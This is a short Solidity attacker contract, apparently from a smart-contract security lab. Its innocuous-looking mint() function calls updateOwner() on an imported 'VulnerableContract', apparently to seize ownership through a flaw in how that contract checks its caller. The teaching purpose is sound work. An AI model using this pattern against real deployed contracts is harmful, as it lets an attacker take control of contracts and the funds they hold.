// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./VulnerableContract.sol";

contract Delegate {

    VulnerableContract public vulnerableContract;


    constructor(address VulnerableContractaddress) {

    vulnerableContract=VulnerableContract(VulnerableContractaddress);
    }
    
    function mint() public {
        // Calling the Vulnerability contract         
        vulnerableContract.updateOwner(); 
    }
}